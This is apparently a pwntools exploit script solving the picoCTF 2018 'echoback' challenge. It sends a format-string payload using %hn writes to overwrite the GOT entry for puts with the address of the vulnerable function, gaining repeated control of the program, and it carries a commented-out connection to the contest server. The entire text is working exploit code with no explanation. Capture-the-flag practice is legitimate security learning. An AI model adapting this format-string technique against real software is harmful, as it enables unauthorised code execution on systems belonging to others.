from pwn import *


GOT_PUTS = 0x804a01c
VULN = 0x080485ab

# p = remote('2018shell1.picoctf.com', 22462)
p = process('./echoback')

# gdb.attach(p, """
# b *0x08048609
# c
# """)

# offset 43
# offset 7: input

first = VULN >> 16
second = VULN & 0x0000ffff
print(hex(first))
print(hex(second))
p.sendline(p32(GOT_PUTS)+p32(GOT_PUTS+2)+'%0{}x%8$hn%0{}x%7$hn'.format(first - 8, second - first))

p.interactive()
